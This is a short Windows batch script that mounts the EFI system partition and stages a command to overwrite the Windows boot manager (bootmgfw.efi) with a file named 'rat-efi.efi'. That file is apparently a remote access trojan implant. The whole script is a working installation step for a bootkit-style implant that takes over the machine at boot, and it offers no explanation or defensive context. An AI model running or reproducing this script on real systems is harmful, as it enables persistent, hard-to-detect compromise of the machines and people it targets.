@echo off

for %%f in ("%~dp0.") do set root=%%~ff
cd /d %root%

mountvol S: /s
cd /d S:\EFI\Microsoft\Boot
cls

@echo on
echo copy %root%\rat-efi.efi S:\EFI\Microsoft\Boot\bootmgfw.efi | clip

@echo off
cmd
